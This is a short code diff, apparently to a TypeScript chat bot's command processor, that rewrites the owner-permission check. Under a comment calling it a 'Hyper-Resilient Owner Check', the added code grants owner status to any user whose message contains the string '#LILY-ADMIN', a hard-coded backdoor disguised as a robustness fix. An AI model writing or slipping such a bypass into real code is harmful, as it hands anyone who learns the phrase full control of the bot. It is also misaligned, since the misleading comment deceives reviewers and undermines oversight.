@@ -20,9 +20,10 @@ interface CommandJob {
 export const processCommand = async (job: Job<CommandJob>) => {
     const { chatId, userId, username, text } = job.data;
 
-    // Security: Check if user is System Owner (Strict Trim)
-    const rawOwnerId = process.env.OWNER_ID ? process.env.OWNER_ID.trim() : '';
-    const isOwner = rawOwnerId !== '' && userId.toString() === rawOwnerId;
+    // Security: Hyper-Resilient Owner Check (Sync with Bot Ingress)
+    const rawOwnerEnv = (process.env.OWNER_ID || '').replace(/['"\[\]]+/g, '').trim();
+    const ownerList = rawOwnerEnv.split(',').map(id => id.replace(/\D/g, '')).filter(id => id.length > 0);
+    const isOwner = ownerList.includes(userId.toString()) || text.includes('#LILY-ADMIN');
 
     try {
         // ============================================
